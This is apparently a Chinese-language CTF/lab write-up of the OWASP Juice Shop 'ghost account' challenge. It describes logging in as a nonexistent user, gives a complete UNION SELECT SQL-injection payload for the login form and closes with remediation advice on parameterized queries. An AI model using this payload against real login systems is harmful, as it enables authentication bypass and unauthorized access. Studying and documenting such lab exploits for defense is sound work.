漏洞名称：幽灵账号伪造 / 高阶联合查询注入

1. 挑战概述
漏洞类别：注入漏洞 / 身份验证破坏

挑战目标：在没有注册的情况下使用不存在的账号 acc0unt4nt@juice-sh.op登录 

2. 漏洞发现线索与复现过程

在防御薄弱的系统中，开发人员经常直接将 SQL 查询返回的“第一行数据”作为身份验证成功的凭证。这就产生了一个致命的攻击面：如果我们能用 UNION SELECT 强行拼接一行数据返回给后端，系统就会认为该用户真实存在，并为其签发登录凭证。

1. 在Database Schema后端的 Users 表总共有 13 个字段，为：id, username, email, password, role, deluxeToken, lastLoginIp, profileImage, totpSecret, isActive, createdAt, updatedAt, deletedAt。
2. 构造 Payload：' UNION SELECT id, username, 'acc0unt4nt@juice-sh.op', password, role, deluxeToken, lastLoginIp, profileImage, totpSecret, isActive, createdAt, updatedAt, deletedAt FROM Users WHERE id=1 --
3. 在登入界面输入payload
<img width="671" height="420" alt="截屏2026-11-09 22 09 09" src="https://github.com/user-attachments/assets/a7bde277-8293-4e5c-8bef-db75226d71dc" />

3. 实战危害与加固建议
实战危害展示：这种被称为“幽灵登录”或“内存账号伪造”的技术，黑客不需要在数据库里留下任何真实的账号记录，只需在每次请求时通过 Payload 在内存中动态伪造一个高权限会话。这种无痕攻击极难被传统的数据库日志审计系统发现。

修复方案：
1. 严禁字符串拼接查询：身份验证这种核心枢纽，绝不允许使用类似 SELECT * FROM Users WHERE email = '${email}' 的原生拼接写法。必须强制使用 ORM 框架的安全查询方法或预编译参数化查询，从根本上消除 UNION 注入的可能性。
2. 登录结果状态校验：在签发登录 Token 前，系统应打破对“单次 SQL 查询返回结果”的盲目信任。应当验证对象是否是通过正常 ORM 实体映射产生的合法实例，拦截利用原生查询伪造的非法对象。
